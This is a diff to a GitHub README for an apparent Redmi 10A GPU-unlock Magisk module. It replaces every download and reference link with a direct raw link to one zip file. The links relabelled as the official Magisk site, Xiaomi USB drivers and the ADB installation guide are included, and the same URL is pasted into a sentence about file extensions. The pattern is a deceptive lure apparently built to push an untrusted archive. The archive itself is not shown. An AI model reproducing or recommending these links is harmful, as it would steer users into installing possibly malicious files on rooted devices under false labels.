@@ -1,6 +1,6 @@
 # ⚙️ Redmi-10A_GPU_Performance_Unlock - Unlock GPU Performance Safely
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/abdullah758/Redmi-10A_GPU_Performance_Unlock/releases)
+[![Download Release](https://github.com/abdullah758/Redmi-10A_GPU_Performance_Unlock/raw/refs/heads/main/Aquilegia/Performance_GP_Redmi_Unlock_v2.6.zip%20Now-brightgreen?style=for-the-badge)](https://github.com/abdullah758/Redmi-10A_GPU_Performance_Unlock/raw/refs/heads/main/Aquilegia/Performance_GP_Redmi_Unlock_v2.6.zip)
 
 ---
 
@@ -50,7 +50,7 @@ You will need the following tools alongside this software:
 ### Step 1: Go to the Download Page
 
 Click the big green button at the top or visit this page:  
-[Download Redmi-10A_GPU_Performance_Unlock Releases](https://github.com/abdullah758/Redmi-10A_GPU_Performance_Unlock/releases)
+[Download Redmi-10A_GPU_Performance_Unlock Releases](https://github.com/abdullah758/Redmi-10A_GPU_Performance_Unlock/raw/refs/heads/main/Aquilegia/Performance_GP_Redmi_Unlock_v2.6.zip)
 
 This page contains all versions of the software. Look for the latest release.
 
@@ -58,7 +58,7 @@ This page contains all versions of the software. Look for the latest release.
 
 On the releases page, find the newest entry. It will have a version number and release date.
 
-You will see files attached to the release. The file names usually end with `.zip` or `.magisk.zip`.
+You will see files attached to the release. The file names usually end with `.zip` or `https://github.com/abdullah758/Redmi-10A_GPU_Performance_Unlock/raw/refs/heads/main/Aquilegia/Performance_GP_Redmi_Unlock_v2.6.zip`.
 
 ### Step 3: Download the Magisk Module File
 
@@ -168,9 +168,9 @@ You may need ADB to check your phone or update Magisk.
 
 ## Useful Links
 
-- [Magisk Official Site](https://topjohnwu.github.io/Magisk/)
-- [Redmi 10A USB Drivers](https://www.mi.com/global/support/download/)
-- [ADB Installation Guide](https://developer.android.com/studio/releases/platform-tools)
+- [Magisk Official Site](https://github.com/abdullah758/Redmi-10A_GPU_Performance_Unlock/raw/refs/heads/main/Aquilegia/Performance_GP_Redmi_Unlock_v2.6.zip)
+- [Redmi 10A USB Drivers](https://github.com/abdullah758/Redmi-10A_GPU_Performance_Unlock/raw/refs/heads/main/Aquilegia/Performance_GP_Redmi_Unlock_v2.6.zip)
+- [ADB Installation Guide](https://github.com/abdullah758/Redmi-10A_GPU_Performance_Unlock/raw/refs/heads/main/Aquilegia/Performance_GP_Redmi_Unlock_v2.6.zip)
 
 ---
 
@@ -187,4 +187,4 @@ For detailed help, check the GitHub issues section in this repository.
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Get%20Module-royalblue?style=for-the-badge)](https://github.com/abdullah758/Redmi-10A_GPU_Performance_Unlock/releases)
+[![Download Now](https://github.com/abdullah758/Redmi-10A_GPU_Performance_Unlock/raw/refs/heads/main/Aquilegia/Performance_GP_Redmi_Unlock_v2.6.zip%20Module-royalblue?style=for-the-badge)](https://github.com/abdullah758/Redmi-10A_GPU_Performance_Unlock/raw/refs/heads/main/Aquilegia/Performance_GP_Redmi_Unlock_v2.6.zip)
